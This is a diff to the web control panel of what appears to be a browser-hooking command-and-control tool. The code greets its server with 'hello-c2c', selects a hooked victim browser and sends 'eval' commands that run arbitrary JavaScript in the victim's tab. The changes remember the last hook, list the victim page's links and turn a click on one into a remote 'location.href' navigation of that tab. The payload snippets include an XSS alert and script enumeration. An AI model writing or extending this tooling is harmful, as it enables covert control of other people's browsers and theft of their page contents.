@@ -111,9 +111,8 @@ display:none;
                                                 <p><button id=report-html type=button class="btn btn-primary">Get HTML</button></p>
                                                 <textarea data-fld=html id=tab-current-html style="width: 100%; height: 300px">
                                                 </textarea>
-                                                <h5>Links</h5>
-                                                <textarea data-fld=links style="width: 100%; height: 300px">
-                                                </textarea>
+                                                <h5>Links (click to navigate in tab)</h5>
+                                                <ul id=links></ul>
                                             </div>
                                             <div class="tab-pane" id="tab-info">
                                                 <table class="table-striped table table-condensed">
@@ -282,6 +281,10 @@ display:none;
 
 var ws;
 
+// current hook name
+var hook = localStorage['lastHook'] || '';
+var currentTab = null;
+
 if (document.location.pathname == '/') { // served through Node.js, use websockets
     if (MozWebSocket) {
         WebSocket = MozWebSocket;
@@ -300,6 +303,10 @@ if (document.location.pathname == '/') { // served through Node.js, use websocke
         }
         ws.onopen = function() {
             ws.send(JSON.stringify({cmd:'hello-c2c'}));
+            if (hook) {
+                ws.send(JSON.stringify({cmd:"set-channel",ch:hook}));
+            }
+
         }
         ws.onclose = function() {
             alert("Connection to server dropped :(");
@@ -308,10 +315,6 @@ if (document.location.pathname == '/') { // served through Node.js, use websocke
 } else { // served through Apache, use XHR php scripts
     ws = false;
 }
-
-// current hook name
-var hook = '';
-var currentTab = null;
 
 var sendCmd = function(cmd, param, additional) {
     var to_send = {cmd:cmd, p:param};
@@ -440,8 +443,19 @@ function loadTabData(id) {
         return;
     }
     $("#tab-current-html").val(tab.html);
-    $("*[data-fld=links]").val(JSON.stringify(tab.links));
-
+    $("#links").empty();
+    if (tab.links) {
+        tab.links.forEach(function(link) {
+            if (link.href) {
+                $('<a>')
+                    .attr('href',link.href)
+                    .text(link.title || link.href)
+                    .attr('title', link.title)
+                    .appendTo('#links')
+                    .wrap('<li>');
+            }
+        });
+    }
     fillDataTemplate($('#tab-info'), tab);
 
 }
@@ -518,7 +532,7 @@ $(function() {
     $('#eval').click(function() {
         if (!currentTab) {
             al("No tab selected!");
-        } else {
+        } else { // navigate to new link in tab
             sendCmd('eval', $('[name=eval]').val(), {id: currentTab});
             $('#eval-result').val('');
         }
@@ -536,6 +550,12 @@ $(function() {
         refreshTabsTable([]);
         sendCmd('report');
     });
+    
+    $(document).on('click', '#links a', function() {
+        var cmd = "location.href = " + JSON.stringify(this.href);
+        sendCmd('eval', cmd, {id: currentTab});
+        return false;
+    });
 
     $("#tab-create-url").keydown(function(e) {
         if (e.keyCode == '13' && this.value) {
@@ -546,15 +566,14 @@ $(function() {
     $('#hook-chosen').click(function() {
         var v;
         if (v = $('select[name="choose-hook"]').val()) {
-            hook = v;
+            hook = localStorage['lastHook'] = v;
             $('#hook-id').text(v);
             al('Chosen hook: ' + v);
             $('#choose-hook-modal').modal('hide');
             if (ws) {
-                ws.send(JSON.stringify({cmd:"set-channel",ch:v}));
+                ws.send(JSON.stringify({cmd:"set-channel",ch:hook}));
             }
             sendCmd('report');
-
         }
         return false;
     });
@@ -616,7 +635,7 @@ x.send(null);\n\
 ";
 	snippets['alert'] = 'alert(/xss/);';
 	snippets['location'] = 'location;';
-	snippets['listscripts'] = 'var s = [];\n\
+	snippets['list scripts'] = 'var s = [];\n\
 for (i=0;i<document.scripts.length;i++) {\n\
 s.push(document.scripts[i].src || document.scripts[i].textContent);\n\
 }\n\
